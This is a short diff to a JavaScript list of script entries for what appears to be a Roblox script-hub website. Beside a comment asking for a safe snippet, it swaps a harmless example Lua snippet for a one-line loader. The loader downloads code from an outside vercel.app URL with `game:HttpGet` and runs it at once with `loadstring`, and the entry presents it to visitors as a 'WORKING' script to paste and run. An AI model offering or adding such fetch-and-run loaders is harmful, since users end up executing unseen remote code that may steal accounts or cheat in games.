@@ -11,24 +11,16 @@ const SCRIPTS = [
     views: "15.4K",
     status: "WORKING",
     // Put your own SAFE/legit snippet here:
-    code: `-- Example utility snippet
-local Players = game:GetService("Players")
-print("Hello from utility script!", Players.LocalPlayer.Name)`,
+    code: `loadstring(game:HttpGet("https://deltahoaxscripts.vercel.app/escapetsunami"))()`,
   },
   {
     id: "movement",
-    title: "MOVEMENT HELPER",
-    subtitle: "Small helper functions",
+    title: "COMING SOON",
+    subtitle: "coming soon",
     badge: "UTIL",
     views: "4.2K",
     status: "UPDATED",
-    code: `-- Example: simple clamp helper
-local function clamp(x, a, b)
-  if x < a then return a end
-  if x > b then return b end
-  return x
-end
-print(clamp(20, 1, 10))`,
+    code: `Coming Soon!`,
   },
 ];
 
